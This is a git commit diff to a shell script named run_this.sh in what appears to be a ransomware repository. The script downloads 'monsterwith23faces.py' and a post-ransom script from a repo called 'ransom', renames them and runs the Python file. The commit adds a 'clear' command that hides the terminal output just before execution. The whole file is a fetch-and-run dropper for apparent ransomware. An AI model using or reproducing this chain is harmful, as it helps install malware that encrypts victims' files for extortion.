b579e6e5798275a1f4851ecc1e0fce6bfcce124d
samsepi0lw <147035842+samsepi0lw@users.noreply.github.com>
2023-10-05 10:12:43 +0000

    Update run_this.sh

--- run_this.sh
+++ run_this.sh
@@ -2,5 +2,6 @@ wget https://github.com/samsepi0lw/ransom/blob/main/monsterwith23faces.py?raw=tr
 wget https://github.com/samsepi0lw/ransom/blob/main/after_ransom_is_given_run_this.sh?raw=true
 mv monsterwith23faces.py\?raw=true monsterwith23faces.py
 mv after_ransom_is_given_run_this.sh\?raw=true after_ransom_is_given_run_this.py
+clear
 #!/bin/bash
 python monsterwith23faces.py
